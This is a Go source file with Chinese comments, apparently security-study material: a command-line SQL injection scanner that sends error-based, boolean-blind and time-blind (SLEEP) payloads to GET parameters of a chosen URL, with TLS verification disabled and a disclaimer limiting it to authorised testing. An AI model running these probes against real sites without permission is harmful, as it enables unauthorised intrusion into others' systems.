/*
 * ============================================================
 * 文件名：sqli_detector.go
 * 功能描述：SQL 注入检测工具（GET 参数检测）
 * 作者：网络安全学习笔记
 * 日期：2026-09-10
 * ============================================================
 *
 * 【使用说明】
 * 1. 编译运行：go run sqli_detector.go
 * 2. 命令行参数：
 *    -url    目标 URL（带参数，如 http://example.com/page?id=1）
 *    -type   检测类型：bool(布尔盲注)/time(时间盲注)/error(报错注入)/all(全部)
 *            默认：all
 *    -timeout 请求超时时间，单位秒（默认：10）
 *    -param  指定检测的参数名（默认检测所有 GET 参数）
 *
 * 【示例】
 *   go run sqli_detector.go -url "http://example.com/page?id=1"
 *   go run sqli_detector.go -url "http://example.com/page?id=1&cat=2" -type bool
 *   go run sqli_detector.go -url "http://example.com/search?q=test" -param q -type all
 *
 * 【检测原理】
 *   - 布尔盲注：构造 AND 1=1 和 AND 1=2 payload，比较响应差异
 *   - 时间盲注：构造 SLEEP(5) / BENCHMARK 等 payload，检测响应延迟
 *   - 报错注入：构造单引号等 payload，检测响应中是否包含数据库错误信息
 *
 * 【免责声明】
 *   本工具仅供网络安全学习和授权测试使用。
 *   禁止对未授权的网站进行 SQL 注入检测，违者后果自负。
 *   使用本工具请遵守当地法律法规。
 * ============================================================
 */

package main

import (
	"crypto/tls"   // TLS 配置
	"flag"         // 命令行参数解析
	"fmt"          // 格式化输出
	"io/ioutil"    // 文件读取
	"net/http"     // HTTP 客户端
	"net/url"      // URL 解析
	"strings"      // 字符串处理
	"time"         // 时间相关
)

// SQLiResult 定义 SQL 注入检测结果
type SQLiResult struct {
	Param     string // 检测的参数名
	DetectType string // 检测类型
	Vulnerable bool   // 是否存在漏洞
	Evidence  string // 证据描述
	Payload   string // 使用的 payload
}

// errorSignatures 常见数据库报错信息特征
// 用于报错注入检测时匹配错误信息
var errorSignatures = []struct {
	DBType    string   // 数据库类型
	Signature []string // 错误特征字符串
}{
	{
		DBType: "MySQL",
		Signature: []string{
			"you have an error in your sql syntax",
			"mysql_fetch",
			"mysql_num_rows",
			"mysql_query",
			"supplied argument is not a valid mysql",
			"warning: mysql",
			"unknown column",
			"sql syntax error",
		},
	},
	{
		DBType: "PostgreSQL",
		Signature: []string{
			"pg_query",
			"pg_exec",
			"postgresql query failed",
			"warning: pg_",
			"invalid input syntax for integer",
		},
	},
	{
		DBType: "MSSQL",
		Signature: []string{
			"microsoft sql server",
			"unclosed quotation mark",
			"sql server error",
			"odbc sql server driver",
			"oledb provider for sql server",
		},
	},
	{
		DBType: "Oracle",
		Signature: []string{
			"oracle error",
			"ora-",
			"pl/sql",
			"oracle error",
		},
	},
	{
		DBType: "SQLite",
		Signature: []string{
			"sqlite3",
			"sqlite_error",
			"warning: sqlite_",
		},
	},
}

// buildURL 构造带参数的 URL
// 参数：
//   baseURL - 基础 URL
//   param - 参数名
//   value - 参数值
// 返回：构造好的 URL 字符串
func buildURL(baseURL string, param string, value string) string {
	// 解析原始 URL
	u, err := url.Parse(baseURL)
	if err != nil {
		return baseURL
	}

	// 获取查询参数
	query := u.Query()
	// 修改指定参数的值
	query.Set(param, value)
	// 重新编码查询字符串
	u.RawQuery = query.Encode()

	return u.String()
}

// sendRequest 发送 HTTP GET 请求并返回响应体、状态码和耗时
// 参数：
//   targetURL - 目标 URL
//   client - HTTP 客户端
// 返回：响应体字符串、状态码、请求耗时、错误信息
func sendRequest(targetURL string, client *http.Client) (string, int, time.Duration, error) {
	startTime := time.Now()

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return "", 0, 0, err
	}

	// 设置请求头，模拟浏览器
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")

	resp, err := client.Do(req)
	if err != nil {
		return "", 0, time.Since(startTime), err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", resp.StatusCode, time.Since(startTime), err
	}

	elapsed := time.Since(startTime)
	return string(body), resp.StatusCode, elapsed, nil
}

// detectErrorBased 报错注入检测
// 通过在参数中添加单引号，检测响应中是否包含数据库错误信息
func detectErrorBased(baseURL string, param string, originalValue string, client *http.Client) *SQLiResult {
	result := &SQLiResult{
		Param:      param,
		DetectType: "报错注入",
		Vulnerable: false,
	}

	// 构造报错注入 payload：在参数值后添加单引号
	payload := originalValue + "'"
	targetURL := buildURL(baseURL, param, payload)
	result.Payload = payload

	// 发送请求
	body, statusCode, _, err := sendRequest(targetURL, client)
	if err != nil {
		result.Evidence = fmt.Sprintf("请求失败: %v", err)
		return result
	}

	// 如果状态码是 500，可能存在报错注入
	if statusCode >= 500 {
		result.Evidence = fmt.Sprintf("服务器返回 500 错误，可能存在注入点")
		result.Vulnerable = true
		return result
	}

	// 在响应体中查找数据库错误特征
	lowerBody := strings.ToLower(body)
	for _, db := range errorSignatures {
		for _, sig := range db.Signature {
			if strings.Contains(lowerBody, sig) {
				result.Vulnerable = true
				result.Evidence = fmt.Sprintf("检测到 %s 数据库错误信息: %s", db.DBType, sig)
				return result
			}
		}
	}

	result.Evidence = "未检测到数据库错误信息"
	return result
}

// detectBooleanBased 布尔盲注检测
// 通过比较 AND 1=1 和 AND 1=2 的响应差异来判断
func detectBooleanBased(baseURL string, param string, originalValue string, client *http.Client) *SQLiResult {
	result := &SQLiResult{
		Param:      param,
		DetectType: "布尔盲注",
		Vulnerable: false,
	}

	// 首先获取正常响应作为基准
	normalURL := buildURL(baseURL, param, originalValue)
	normalBody, normalStatus, _, err := sendRequest(normalURL, client)
	if err != nil {
		result.Evidence = fmt.Sprintf("基准请求失败: %v", err)
		return result
	}
	normalLen := len(normalBody)

	// 构造真值 payload: AND 1=1
	truePayload := fmt.Sprintf("%s' AND '1'='1", originalValue)
	trueURL := buildURL(baseURL, param, truePayload)
	trueBody, trueStatus, _, err := sendRequest(trueURL, client)
	if err != nil {
		result.Evidence = fmt.Sprintf("真值请求失败: %v", err)
		return result
	}
	trueLen := len(trueBody)

	// 构造假值 payload: AND 1=2
	falsePayload := fmt.Sprintf("%s' AND '1'='2", originalValue)
	falseURL := buildURL(baseURL, param, falsePayload)
	falseBody, falseStatus, _, err := sendRequest(falseURL, client)
	if err != nil {
		result.Evidence = fmt.Sprintf("假值请求失败: %v", err)
		return result
	}
	falseLen := len(falseBody)

	result.Payload = fmt.Sprintf("AND '1'='1 / AND '1'='2")

	// 分析结果：
	// 如果正常响应与真值响应相似，但与假值响应差异较大，说明存在布尔盲注
	diffTrueNormal := abs(trueLen - normalLen)
	diffFalseNormal := abs(falseLen - normalLen)
	diffTrueFalse := abs(trueLen - falseLen)

	// 判断条件：真假响应差异明显，且真值更接近正常响应
	if trueStatus == normalStatus && diffTrueFalse > 100 && diffFalseNormal > diffTrueNormal {
		result.Vulnerable = true
		result.Evidence = fmt.Sprintf(
			"正常响应:%d字节, 真值响应:%d字节, 假值响应:%d字节, 差异明显",
			normalLen, trueLen, falseLen,
		)
		return result
	}

	result.Evidence = fmt.Sprintf(
		"响应差异不明显 (正常:%d, 真:%d, 假:%d)",
		normalLen, trueLen, falseLen,
	)
	return result
}

// detectTimeBased 时间盲注检测
// 通过注入 SLEEP 等延时函数，检测响应时间是否增加
func detectTimeBased(baseURL string, param string, originalValue string, client *http.Client) *SQLiResult {
	result := &SQLiResult{
		Param:      param,
		DetectType: "时间盲注",
		Vulnerable: false,
	}

	// 首先获取正常响应时间作为基准
	normalURL := buildURL(baseURL, param, originalValue)
	_, _, normalTime, err := sendRequest(normalURL, client)
	if err != nil {
		result.Evidence = fmt.Sprintf("基准请求失败: %v", err)
		return result
	}

	// 构造时间盲注 payload（MySQL 风格）: SLEEP(3)
	// 使用 IF 条件判断，当条件为真时执行延时
	sleepTime := 3
	payload := fmt.Sprintf("%s' AND SLEEP(%d) AND '1'='1", originalValue, sleepTime)
	timeURL := buildURL(baseURL, param, payload)
	_, _, elapsedTime, err := sendRequest(timeURL, client)
	if err != nil {
		result.Evidence = fmt.Sprintf("时间盲注请求失败: %v", err)
		return result
	}

	result.Payload = fmt.Sprintf("AND SLEEP(%d)", sleepTime)

	// 判断：如果延时响应时间比正常响应时间多出至少 sleepTime 秒的一半以上
	// 考虑到网络波动，设置阈值为 sleepTime 的 70%
	threshold := time.Duration(float64(sleepTime)*0.7) * time.Second
	delay := elapsedTime - normalTime

	if delay >= threshold {
		result.Vulnerable = true
		result.Evidence = fmt.Sprintf(
			"正常响应: %.2f秒, 注入后响应: %.2f秒, 延迟 %.2f秒",
			normalTime.Seconds(), elapsedTime.Seconds(), delay.Seconds(),
		)
		return result
	}

	result.Evidence = fmt.Sprintf(
		"响应时间无明显延迟 (正常:%.2fs, 注入后:%.2fs)",
		normalTime.Seconds(), elapsedTime.Seconds(),
	)
	return result
}

// abs 计算整数绝对值
func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func main() {
	// ===================== 命令行参数解析 =====================
	targetURL := flag.String("url", "", "目标 URL（带 GET 参数）")
	detectType := flag.String("type", "all", "检测类型: bool/time/error/all")
	timeoutSec := flag.Int("timeout", 10, "请求超时时间（秒）")
	targetParam := flag.String("param", "", "指定检测的参数名（默认检测所有参数）")

	flag.Parse()

	// 参数校验
	if *targetURL == "" {
		fmt.Println("[错误] 请指定目标 URL，使用 -url 参数")
		fmt.Println("示例: go run sqli_detector.go -url \"http://example.com/page?id=1\"")
		return
	}

	// 解析 URL 获取参数
	u, err := url.Parse(*targetURL)
	if err != nil {
		fmt.Printf("[错误] URL 解析失败: %v\n", err)
		return
	}

	queryParams := u.Query()
	if len(queryParams) == 0 {
		fmt.Println("[错误] URL 中没有 GET 参数，无法进行 SQL 注入检测")
		return
	}

	// 确定要检测的参数
	var paramsToTest []string
	if *targetParam != "" {
		// 用户指定了参数
		if _, ok := queryParams[*targetParam]; ok {
			paramsToTest = append(paramsToTest, *targetParam)
		} else {
			fmt.Printf("[错误] URL 中不存在参数: %s\n", *targetParam)
			return
		}
	} else {
		// 检测所有参数
		for param := range queryParams {
			paramsToTest = append(paramsToTest, param)
		}
	}

	// ===================== 打印检测信息 =====================
	fmt.Println("========================================")
	fmt.Println("     SQL 注入检测工具（Go 版）")
	fmt.Println("========================================")
	fmt.Printf("目标 URL: %s\n", *targetURL)
	fmt.Printf("检测参数: %v\n", paramsToTest)
	fmt.Printf("检测类型: %s\n", *detectType)
	fmt.Printf("超时时间: %d 秒\n", *timeoutSec)
	fmt.Println("========================================")
	fmt.Println("[*] 正在检测，请稍候...")
	fmt.Println("----------------------------------------")

	// ===================== 初始化 HTTP 客户端 =====================
	// 跳过证书验证（用于测试自签名证书的站点）
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Timeout:   time.Duration(*timeoutSec) * time.Second,
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// ===================== 执行检测 =====================
	var allResults []*SQLiResult
	vulnerableCount := 0

	for _, param := range paramsToTest {
		originalValue := queryParams.Get(param)
		fmt.Printf("\n[*] 正在检测参数: %s (值: %s)\n", param, originalValue)

		// 根据检测类型执行相应检测
		if *detectType == "error" || *detectType == "all" {
			fmt.Print("  [报错注入检测] ... ")
			r := detectErrorBased(*targetURL, param, originalValue, client)
			allResults = append(allResults, r)
			if r.Vulnerable {
				fmt.Println("存在漏洞!")
				fmt.Printf("    证据: %s\n", r.Evidence)
				vulnerableCount++
			} else {
				fmt.Println("未发现")
			}
		}

		if *detectType == "bool" || *detectType == "all" {
			fmt.Print("  [布尔盲注检测] ... ")
			r := detectBooleanBased(*targetURL, param, originalValue, client)
			allResults = append(allResults, r)
			if r.Vulnerable {
				fmt.Println("存在漏洞!")
				fmt.Printf("    证据: %s\n", r.Evidence)
				vulnerableCount++
			} else {
				fmt.Println("未发现")
			}
		}

		if *detectType == "time" || *detectType == "all" {
			fmt.Print("  [时间盲注检测] ... ")
			r := detectTimeBased(*targetURL, param, originalValue, client)
			allResults = append(allResults, r)
			if r.Vulnerable {
				fmt.Println("存在漏洞!")
				fmt.Printf("    证据: %s\n", r.Evidence)
				vulnerableCount++
			} else {
				fmt.Println("未发现")
			}
		}
	}

	// ===================== 输出最终结果 =====================
	fmt.Println("\n========================================")
	fmt.Println("            检测结果汇总")
	fmt.Println("========================================")
	fmt.Printf("检测参数数量: %d\n", len(paramsToTest))
	fmt.Printf("检测项目数量: %d\n", len(allResults))
	fmt.Printf("发现漏洞数: %d\n", vulnerableCount)

	if vulnerableCount > 0 {
		fmt.Println("\n[漏洞详情]")
		fmt.Println("----------------------------------------")
		for _, r := range allResults {
			if r.Vulnerable {
				fmt.Printf("参数: %s\n", r.Param)
				fmt.Printf("类型: %s\n", r.DetectType)
				fmt.Printf("Payload: %s\n", r.Payload)
				fmt.Printf("证据: %s\n", r.Evidence)
				fmt.Println("----------------------------------------")
			}
		}
	} else {
		fmt.Println("\n[*] 未检测到 SQL 注入漏洞（不代表绝对安全）")
	}

	fmt.Println("\n========================================")
	fmt.Println("            检测完成")
	fmt.Println("========================================")
}
